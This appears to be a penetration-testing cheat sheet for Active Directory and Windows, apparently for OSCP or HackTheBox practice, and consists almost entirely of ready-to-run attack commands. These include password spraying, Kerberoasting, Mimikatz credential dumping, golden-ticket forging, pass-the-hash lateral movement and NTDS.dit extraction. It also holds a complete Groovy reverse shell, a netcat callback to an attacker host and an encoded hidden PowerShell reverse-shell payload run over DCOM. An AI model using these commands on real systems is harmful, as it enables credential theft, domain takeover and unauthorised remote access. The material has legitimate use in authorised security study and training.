ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Computers,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Domain Users,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Enterprise Admins,CN=Users,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Administrators,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"
ldapsearch -x -H ldap://<IP> -D '<DOMAIN>\<username>' -w '<password>' -b "CN=Remote Desktop Users,CN=Builtin,DC=<1_SUBDOMAIN>,DC=<TLD>"

#windapsearch.py
#for computers
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --computers

#for groups
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --groups

#for users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --da

#for privileged users
python3 windapsearch.py --dc-ip <IP address> -u <username> -p <password> --privileged-users

# gMSA (Group Managed Service Account)
netexec ldap dc01.domain.htb  -u userprivilege -p  password -k --gmsa
```

### Delegation Permissions | AD

```powershell
# Find user accounts with delegation permissions in an Active Directory environment.
findDelegation.py domain/user:'password' -dc-ip dc01 -k
```

https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained

https://snovvcrash.rocks/2022/03/06/abusing-kcd-without-protocol-transition.html

### TGS | Ticket Granting Service

```powershell
# for SPN (Service Principal Name) (Kerberos)
getST.py -dc-ip domain.htb -spn http/dc01.domain.htb -hashes :IP -impersonate administrator domain.htb/'user' -self

# get a TGT as user$
getTGT.py 'domain/user$' -hashes :ah9737 -dc-ip domain.htb
```

### Attack RBCD

```powershell
# Resource-Based Constrained Delegation (RBCD)
rbcd.py 'domain.htb/user$' -hashes :2787gd8... -delegate-to 'user$' -delegate-from 'user1' -dc-ip dc01 -action 'write' -k -user-ldaps

# Abuse Contrained and RCBD
getST.py domain.htb/user1:'pass' -spn browser/dc01.domain.htb -impersonate 'DC01$'

```

### AS-REP Roasting

```powershell
#As-rep-roasting
netexec ldap domain -u file.txt -p '' --asreproast asrp.txt

```

### reGeorg

```powershell
# Config proxychains to 127.0.0.1 1234 (create a tunnel priv for internal ports of target)
$ python reGeorgSocksProxy.py -p 1234 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp 
```

### Socat

```powershell
# Tunnel TCP
sudo socat -v TCP-LISTEN:135, fork, reuseaddr TCP:IP:PORT
```

### Password Spray

```powershell
# password spray
netexec smb rebound.htb -u users -p '1GR8t@$$4u' --continue-on-success 

#Password Spray - we have a some user but just one password
crackmapexec ldap 10.10.10.12 -u file.txt -p pepito123 --kerberos --continue-on-succes

crackmapexec smb IP/host -u users.txt -p 'pass' -d domain.htb --continue-on-success #use continue-on-success option if it's subnet

proxychains -q /home/kali/go/bin/kerbrute passwordspray -d domain.htb users.txt password1 --dc 10.10.103.152 -vvv

# Brute Force 
kerbrute bruteuser -d domain.com jeffadmin password.txt

kerbrute passwordspray -d domain.htb users.txt password1
```

### Evil-Winrm

```powershell
#login with user and password
sudo evil-winrm -i blazorized.htb -u RSA_4810 -p '(Ni7856Do9854Ki05Ng0005 #)' 

##Login with Hash
evil-winrm -i $IP -u user -H ntlmhash

sudo evil-winrm -i blazorized.htb -u Administrator -H 'Ni7856Do9854Ki05Ng0005wa2e'

# Loading files directly from kali
evil-winrm -i $IP -u user -p pass -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

##evil-winrm commands
menu # to view commands
#There are several commands to run
#This is an example for running a binary
evil-winrm -i <IP> -u user -p pass -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe

#login with proxychains to tunnel priv
proxychains evil-winrm -i 127.0.0.1 -u 'simple' -p 'password' 2>/dev/null
```

### Impacket

```powershell
smbclient.py [domain]/[user]:[password/password hash]@[Target IP Address] #we connect to the server rather than a share

lookupsid.py [domain]/[user]:[password/password hash]@[Target IP Address] #User enumeration on target

services.py [domain]/[user]:[Password/Password Hash]@[Target IP Address] [Action] #service enumeration

secretsdump.py [domain]/[user]:[password/password hash]@[Target IP Address]  #Dumping hashes on target

GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS

GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list

GetNPUsers.py -usersfile users domain.htb/ -dc-ip 10.10.11.231

##RCE
psexec.py test.local/john:password123@10.10.10.1
psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

wmiexec.py test.local/john:password123@10.10.10.1
wmiexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

smbexec.py test.local/john:password123@10.10.10.1
smbexec.py -hashes lmhash:nthash test.local/john@10.10.10.1

atexec.py test.local/john:password123@10.10.10.1 <command>
atexec.py -hashes lmhash:nthash test.local/john@10.10.10.1 <command>


```

### NFS Enumeration

```powershell
nmap -sV --script=nfs-showmount IP
showmount -e IP
```

### SNMP Enumeration

```powershell
#Nmap UDP scan
sudo nmap <IP> -A -T4 -p- -sU -v -oN nmap-udpscan.txt

snmpcheck -t <IP> -c public #Better version than snmpwalk as it displays more user friendly

snmpwalk -c public -v1 -t 10 <IP> #Displays entire MIB tree, MIB Means Management Information Base
snmpwalk -c public -v1 <IP> 1.3.6.1.4.1.77.1.2.25 #Windows User enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.4.2.1.2 #Windows Processes enumeration
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.25.6.3.1.2 #Installed software enumeraion
snmpwalk -c public -v1 <IP> 1.3.6.1.2.1.6.13.1.3 #Opened TCP Ports

#Windows MIB values
1.3.6.1.2.1.25.1.6.0 - System Processes
1.3.6.1.2.1.25.4.2.1.2 - Running Programs
1.3.6.1.2.1.25.4.2.1.4 - Processes Path
1.3.6.1.2.1.25.2.3.1.4 - Storage Units
1.3.6.1.2.1.25.6.3.1.2 - Software Name
1.3.6.1.4.1.77.1.2.25 - User Accounts
1.3.6.1.2.1.6.13.1.3 - TCP Local Ports
```

### RPC Enumeration

```powershell
rpcclient -U=user $IP
rpcclient -U="" $IP #Anonymous login
##Commands within in RPCclient
srvinfo
enumdomusers #users
enumpriv #like "whoami /priv"
queryuser <user> #detailed user info
getuserdompwinfo <RID> #password policy, get user-RID from previous command
lookupnames <user> #SID of specified user
createdomuser <username> #Creating a user
deletedomuser <username>
enumdomains
enumdomgroups
querygroup <group-RID> #get rid from previous command
querydispinfo #description of all users
netshareenum #Share enumeration, this only comesup if the current user we're logged in has permissions
netshareenumall
lsaenumsid #SID of all users
```

- Tip: The user for get a shell, need to are in 'Remote Managament User' Group.

### Mimikatz

```powershell
# Dumps credentials from memory, using the Mimikatz module in PowerShell.
Invoke-Mimikatz -DumpCreds 

sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<command>: # Allows authentication using NTLM hashes, enabling lateral movement without knowing the password.

sekurlsa::logonpasswords # Extracts plaintext passwords and hashes for logged-in users.

privilege::debug

token::elevate

lsadump::sam
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /domain:domain.htb /user:Administrator
lsadump::lsa /patch
```
#### Mimikatz | CheatSheet

```powershell
#general
privilege::debug
log
log customlogfilename.log


#sekurlsa
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd

#kerberos
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi

kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi

.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt

#crypto
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export

#vault & lsadump
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local

#pth
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe

#ekeys
sekurlsa::ekeys

#dpapi
sekurlsa::dpapi

#minidump
sekurlsa::minidump lsass.dmp

#ptt
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi

#golden/silver
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi

#tgt
kerberos::tgt

#purge
kerberos::purge
```

### Groovy reverse-shell

```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Shadow Credentials (kerberos)

```powershell
certipy shadow auto -username user@domain.htb -password 'pass' -k -account winrm_svc -target dc01.rebound.htb
```


### Credential Delegation (Kerberos)

```powershell
# https://github.com/antonioCoco/RemotePotato0
.\RemotePotato0.exe -m 2 -s 1 -x ip -p port
```

### Ligolo-ng

```powershell
#Creating interface and starting it.
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

#Kali machine - Attacker machine
./proxy -laddr 0.0.0.0:9001 -selfcert

#windows or linux machine - compromised machine
agent.exe -connect <LHOST>:9001 -ignore-cert

#In Ligolo-ng console
session #select host
ifconfig #Notedown the internal network's subnet
start #after adding relevent subnet to ligolo interface

#Adding subnet to ligolo interface - Kali linux
sudo ip r add <subnet> dev ligolo
```

### Windows Privilege Escalation

`cd C:\ & findstr /SI /M "OS{" *.xml *.ini *.txt` - for finding files which contain OSCP flag..
#### Manual Enumeration commands

```powershell
#Groups we're part of
whoami /groups

# lists everything we own.
whoami /all 

Get-Acl -Path <file or directory> # Displays the Access Control List (ACL) for files or directories, to check for misconfigurations or weak permissions.
Get-LocalGroupMember Administrators # Checks if the current user has admin privileges.
icacls <file or folder> # Similar to Get-Acl, lists permissions for files and folders
Invoke-BypassUAC # From PowerSploit; technique to bypass UAC (User Account Control), such as loading specific DLLs or using certain exploits.
# Networking

Invoke-Command -ComputerName <target> -ScriptBlock { commands } # Executes PowerShell commands on a remote machine.

Enter-PSSession -ComputerName <target> # Establishes an interactive session with a remote machine using PowerShell remoting.

# Copy Files to Remote System

Copy-Item -Path <local> -Destination \\<remote>\C$\<path> # Copies files to a remote system’s administrative share (requires administrative privileges).

#Starting, Restarting and Stopping services in Powershell
Start-Service <service>
Stop-Service <service>
Restart-Service <service>

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath #displays the path of consoleHost_history.txt
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#Viewing installed execuatbles
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Process Information
Get-Process
Get-Process | Select ProcessName,Path

#Sensitive info in XAMPP Directory
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue #this for a specific user

#Service Information
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

### Windows Directory

```powershell
C:\windows\system32 # stores essential system binaries and lib
C:\windows\system32\drives # location for device drivers
C:\windows\system32\config # holds system config files, such as the registry hives
C:\Temp or C:\Windows\Temp # temporary files that are deleted upon reboot
C:\Recycle Bin # default location for deleted files
C:\windows\Installer # stores installation files and metadata
C:\windows\WinSxS # stores side-by-side assemblies and system components
C:\windows\Tasks # location for scheduled tasks
C:\windows\Prefetch # Contains preloaded application data
C:\windows\Inf # Contains setup information 
C:\windows\Logs # stores various log files generated by the system components
C:\windows\assembly # location for global assembly cache
C:\windows\System #legacy directory on older windows v
C:\windows\Help
```

### Automated Scripts

```bash
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1
```

### Token Impersonation

- Command to check whoami /priv

```powershell
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"

#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

#SharpEfsPotato
SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
#writes whoami command to w.log file
```

---

# Post Exploitation

> This is more windows specific as exam specific.

<aside>
💡 Run WinPEAS.exe - This may give us some more detailed information as no we’re a privileged user and we can open several files, gives some edge!

</aside>

## Sensitive Information

### Powershell History

```powershell
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#Example
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
```

### Searching for passwords

```powershell
dir .s *pass* == *.config
findstr /si password *.xml *.ini *.txt
```

### Searching in Registry for Passwords

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

<aside>
💡 Always check documents folders, i may contain some juicy files

</aside>

### KDBX Files

```powershell
#These are KeyPassX password stored files
cmd> dir /s /b *.kdbx 
Ps> Get-ChildItem -Recurse -Filter *.kdbx

#Cracking
keepass2john Database.kdbx > keepasshash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt keepasshash
```

## Dumping Hashes

1. Use Mimikatz
2. If this is a domain joined machine, run BloodHound.

---

# Active Directory Pentesting

<aside>
💡 We perform the following stuff once we’re in AD network

</aside>

## Enumeration

```bash
net localgroup Administrators #to check local admins 
```

### Powerview

```powershell
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetDomain #basic information about the domain
Get-NetUser #list of all users in the domain
# The above command's outputs can be filtered using "select" command. For example, "Get-NetUser | select cn", here cn is sideheading for   the output of above command. we can select any number of them seperated by comma.
Get-NetGroup # enumerate domain groups
Get-NetGroup "group name" # information from specific group
Get-NetComputer # enumerate the computer objects in the domain
Find-LocalAdminAccess # scans the network in an attempt to determine if our current user has administrative permissions on any computers in the domain
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name 

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
Get-ObjectAcl -Identity "group-name" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights 

Find-DomainShare #find the shares in the domain

Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts

Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
```

### Bloodhound

- Collection methods - database

```powershell
# Sharphound - transfer sharphound.ps1 into the compromised machine
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine

# Bloodhound-Python
bloodhound-python -u 'uname' -p 'pass' -ns <rhost> -d <domain-name> -c all #output will be saved in you kali machine
```

- Running Bloodhound

```powershell
sudo neo4j console
# then upload the .json files obtained
```

### LDAPDOMAINDUMP

- These files contains information in a well structured webpage format.

```bash
sudo ldapdomaindump ldaps://<IP> -u 'username' -p 'password' #Do this in a new folder
```

### PlumHound

- Link: https://github.com/PlumHound/PlumHound install from the steps mentioned.
- Keep both Bloodhound and Neo4j running as this tool acquires information from them.

```bash
sudo python3 plumhound.py --easy -p <neo4j-password> #Testing connection
python3 PlumHound.py -x tasks/default.tasks -p <neo4jpass> #Open index.html as once this command is completed it produces somany files
firefox index.html
```

### PingCastle

- [www.pingcastle.com](https://www.pingcastle.com) - Download Zip file from here.
- This needs to be run on windows machine, just hit enter and give the domain to scan.
- It gives a report at end of scan.

### PsLoggedon

```powershell
# To see user logons at remote system of a domain(external tool)
.\PsLoggedon.exe \\<computername>
```

### GPP or CPassword

- Impacket

```bash
# with a NULL session
Get-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'

# with cleartext credentials
Get-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# pass-the-hash (with an NT hash)
Get-GPPPassword.py -hashes :'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'

# parse a local file
Get-GPPPassword.py -xmlfile '/path/to/Policy.xml' 'LOCAL'
```

- SMB share - If SYSVOL share or any share which `domain` name as folder name

```bash
#Download the whole share
https://github.com/ahmetgurel/Pentest-Hints/blob/master/AD%20Hunting%20Passwords%20In%20SYSVOL.md
#Navigate to the downloaded folder
grep -inr "cpassword"
```

- Crackmapexec

```bash
crackmapexec smb <TARGET[s]> -u <USERNAME> -p <PASSWORD> -d <DOMAIN> -M gpp_password
crackmapexec smb <TARGET[s]> -u <USERNAME> -H LMHash:NTLMHash -d <DOMAIN> -M gpp_password
```

- Decrypting the CPassword

```bash
gpp-decrypt "cpassword"
```

## **Attacking Active Directory**

<aside>
💡 Make sure you obtain all the relevant credentials from compromised systems, we cannot survive if we don’t have proper creds.

</aside>

### Zerologon

- [Exploit](https://github.com/VoidSec/CVE-2020-1472)
- We can dump hashes on target even without any credentials.

### Password Spraying

```powershell
# Crackmapexec - check if the output shows 'Pwned!'
crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet

# Kerbrute
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
```

### AS-REP Roasting

```powershell
impacket-GetNPUsers -dc-ip <DC-IP> <domain>/<user>:<pass> -request #this gives us the hash of AS-REP Roastable accounts, from kali linux
.\Rubeus.exe asreproast /nowrap #dumping from compromised windows host

hashcat -m 18200 hashes.txt wordlist.txt --force # cracking hashes
```

### Kerberoasting

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast #dumping from compromised windows host, and saving with customname

impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request #from kali machine

hashcat -m 13100 hashes.txt wordlist.txt --force # cracking hashes
```

### Silver Tickets

- Obtaining hash of an SPN user using **Mimikatz**

```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID

```powershell
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain   SID is "S-1-5-21-1987370270-658905905-1781884369"
```

- Forging silver ticket Ft **Mimikatz**

```powershell
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user>
exit

# we can check the tickets by,
ps> klist
```

- Accessing service

```powershell
ps> iwr -UseDefaultCredentials <servicename>://<computername>
```

### Secretsdump

```powershell
secretsdump.py <domain>/<user>:<password>@<IP>
secretsdump.py uname@IP -hashes lmhash:ntlmhash #local user
secretsdump.py domain/uname@IP -hashes lmhash:ntlmhash #domain user
```

### Dumping NTDS.dit

```bash
secretsdump.py <domain>/<user>:<password>@<IP> -just-dc-ntlm
#use -just-dc-ntlm option with any of the secretsdump command to dump ntds.dit
```

## Lateral Movement in Active Directory

### psexec - smbexec - wmiexec - atexec

- Here we can pass the credentials or even hash, depending on what we have

> *Always pass full hash to these tools!*
> 

```powershell
psexec.py <domain>/<user>:<password1>@<IP>
# the user should have write access to Admin share then only we can get sesssion

psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

smbexec.py <domain>/<user>:<password1>@<IP>

smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

wmiexec.py <domain>/<user>:<password1>@<IP>

wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command> 
#we passed full hash here

atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 <domain>/<user>@<IP> <command>
#we passed full hash here
```

### winrs

```powershell
winrs -r:<computername> -u:<user> -p:<password> "command"
# run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
# run this on windows session
```

### crackmapexec

- If stuck make use of [Wiki](https://www.crackmapexec.wiki/)

```powershell
crackmapexec {smb/winrm/mssql/ldap/ftp/ssh/rdp} #supported services
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success # Bruteforcing attack, smb can be replaced. Shows "Pwned"
crackmapexec smb <Rhost/range> -u user.txt -p password.txt --continue-on-success | grep '[+]' #grepping the way out!
crackmapexec smb <Rhost/range> -u user.txt -p 'password' --continue-on-success  #Password spraying, viceversa can also be done

#Try --local-auth option if nothing comes up
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --shares #lists all shares, provide creds if you have one
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --disks
crackmapexec smb <DC-IP> -u 'user' -p 'password' --users #we need to provide DC ip
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sessions #active logon sessions
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --pass-pol #dumps password policy
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --sam #SAM hashes
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --lsa #dumping lsa secrets
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --ntds #dumps NTDS.dit file
crackmapexec smb <Rhost/range> -u 'user' -p 'password' --groups {groupname} #we can also run with a specific group and enumerated users of that group.
crackmapexec smb <Rhost/range> -u 'user' -p 'password' -x 'command' #For executing commands, "-x" for cmd and "-X" for powershell command

#Pass the hash
crackmapexec smb <ip or range> -u username -H <full hash> --local-auth
#We can run all the above commands with hash and obtain more information

#crackmapexec modules
crackmapexec smb -L #listing modules
crackmapexec smb -M mimikatx --options #shows the required options for the module
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz #runs default command
crackmapexec smb <Rhost> -u 'user' -p 'password' -M mimikatz -o COMMAND='privilege::debug' #runs specific command-M 
```

- Crackmapexec database

```bash
cmedb #to launch the console
help #run this command to view some others, running individual commands give infor on all the data till now we did.
```

### Pass the ticket

```powershell
.\mimikatz.exe
sekurlsa::tickets /export
kerberos::ptt [0;76126]-2-0-40e10000-Administrator@krbtgt-<RHOST>.LOCAL.kirbi
klist
dir \\<RHOST>\admin$
```

### DCOM

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.50.73"))

$dcom.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")

$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5A...
AC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA","7")
```

### Golden Ticket

1. Get the krbtgt hash

```powershell
.\mimikatz.exe
privilege::debug
#below are some ways
lsadump::lsa /inject /name:krbtgt
lsadump::lsa /patch
lsadump::dcsync /user:krbtgt

kerberos::purge #removes any exisiting tickets

#sample command
kerberos::golden /user:sathvik /domain:evilcorp.com /sid:S-1-5-21-510558963-1698214355-4094250843 /krbtgt:4b4412bbe7b3a88f5b0537ac0d2bf296 /ticket:golden

#Saved with name "golden" here, there are other options to check as well
```

1. Obtaining access!

```powershell
mimikatz.exe #no need for highest privileges
kerberos::ptt golden
misc::cmd #we're accessing cmd
```

### Shadow Copies

```powershell
vshadow.exe -nw -p C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.bak
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```
---

## Tools

```bash
[OSCP](https://github.com/0xsyr0/OSCP)
[CheatSheet](https://github.com/exfilt/CheatSheet)
```
